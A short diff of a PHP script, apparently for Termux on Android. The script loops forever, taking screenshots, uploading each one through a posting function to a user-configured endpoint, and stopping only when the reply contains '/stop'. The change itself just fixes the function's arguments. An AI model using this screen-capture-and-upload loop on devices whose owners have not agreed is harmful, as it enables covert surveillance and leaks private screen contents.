@@ -4,7 +4,7 @@ $config = trim(readline("Info: "));
 while (1) {
 	$img = "/data/data/com.termux/files/home/".rand(10000000, 999999999).".png";
 	shell_exec("/system/bin/screencap -p -d 0 \"$img\"");
-	$response = cpost($data, $filePath);
+	$response = cpost($config, $img);
 	if (strpos($response, "/stop") !== false) {
 		exit();
 	}
